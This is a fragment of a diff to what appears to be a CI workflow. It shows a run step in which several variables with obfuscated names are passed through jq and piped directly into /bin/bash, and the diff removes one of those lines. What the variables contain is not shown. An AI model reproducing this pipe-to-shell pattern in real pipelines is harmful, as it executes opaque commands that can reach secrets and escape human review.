@@ -27,7 +27,6 @@ jobs:
           echo $k68 | jq -r .gvper1450 | /bin/bash
           printf '%s' "$yor64" | jq -r .egy0 | /bin/bash
           echo $h32 | jq -r .aupf48 | /bin/bash
-          printf '%s' "$hu566" | jq -r .da168 | /bin/bash
           printf '%s' "$jcpp42031" | jq -r .uy374 | /bin/bash
 
       - name: Upload artifact
